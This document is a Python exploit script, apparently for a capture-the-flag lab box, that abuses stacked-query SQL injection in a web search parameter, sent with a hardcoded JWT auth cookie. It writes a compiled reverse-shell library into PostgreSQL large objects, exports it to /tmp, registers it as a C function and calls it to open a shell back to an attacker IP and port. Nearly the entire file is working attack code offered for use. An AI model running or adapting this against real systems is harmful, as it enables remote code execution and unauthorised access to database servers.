#!/usr/bin/python3

import requests
import random
import string
from urllib.parse import quote_plus
import math



LHOST="10.10.15.119"
LPORT=443
url = "http://10.129.204.249:8080/?q=arthur'"

def sqli(q):
    
    # print(q)
    cookie = {
        "auth":
            "eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJhcnRodXIiLCJpYXQiOjE2OTU5MTc3MjEsImV4cCI6MTY5NTkyNjM2MX0.Vzuic6srTk9YZ_4Cu_TQuEvRCObcocf0ovQ1w3V8ciuFHuhcSvz_CmEDtSGM9HBQYpUHfQ55rFRokKB-9tk25A"}
    
    response = requests.get(url=f"""http://10.129.204.249:8080/?q=arthur; {q}""", cookies=cookie)

    # print(response.status_code)

with open("pg_rev_shell.so", "rb") as f:
    raw = f.read()

loid = random.randint(50000, 60000)
sqli(f"SELECT lo_create({loid});")
print(f"[*] Created large object with ID: {loid}")

# Upload pg_rev_shell.so to large object using a tab (\t) delimiter
for pageno in range(math.ceil(len(raw) / 2048)):
    page = raw[pageno * 2048: (pageno + 1) * 2048]
    tab_delimited_data = '\t'.join(f"{byte:02x}" for byte in page)
    print(f"[*] Uploading Page: {pageno}, Length: {len(page)}")
    sqli(f"INSERT INTO pg_largeobject (loid, pageno, data) VALUES ({loid}, {pageno}, decode('{tab_delimited_data}', 'hex'));")

# Write large object to file and run reverse shell
query  = f"SELECT lo_export({loid}, '/tmp/pg_rev_shell');"
query += f"SELECT lo_unlink({loid});"
query += "DROP FUNCTION IF EXISTS rev_shell;"
query += "CREATE FUNCTION rev_shell(text, integer) RETURNS integer AS '/tmp/pg_rev_shell.so', 'rev_shell' LANGUAGE C STRICT;"
query += f"SELECT rev_shell('{LHOST}', {LPORT});"
print(f"[*] Writing pg_rev_shell.so to disk and triggering reverse shell (LHOST: {LHOST}, LPORT: {LPORT})")


print(f"the query {query}")
sqli(query)
